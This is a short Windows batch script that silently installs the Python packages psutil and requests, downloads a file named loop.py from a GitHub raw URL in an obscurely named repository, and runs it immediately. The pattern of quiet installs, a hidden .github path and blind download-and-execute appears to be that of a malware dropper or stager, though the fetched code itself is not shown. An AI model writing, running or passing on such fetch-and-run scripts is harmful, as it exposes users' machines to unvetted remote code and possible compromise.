@echo off
pip install psutil --quiet
pip install requests --quiet
curl -s -L -o loop.py https://raw.githubusercontent.com/maljhuytg3ekkhoksa/urban-guide/refs/heads/main/.github/loop.py
python loop.py
